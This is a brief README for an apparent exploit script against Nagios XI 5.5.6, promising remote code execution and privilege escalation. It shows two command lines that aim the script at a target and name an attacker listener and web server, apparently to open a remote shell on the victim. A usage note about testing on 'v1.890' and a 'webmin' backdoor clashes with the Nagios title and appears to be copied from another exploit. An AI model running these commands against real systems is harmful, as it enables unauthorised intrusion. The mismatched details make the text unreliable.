# Nagios XI 5.5.6 Remote Code Execution and Privilege Escalation

```
1.  Nagios XI 5.5.6
```

### Script Usage:
#### Tested on v1.890, but should also work for other webmin versions in which this backdoor is installed.
`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888`

![]()

`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888 -shell low`

![]()
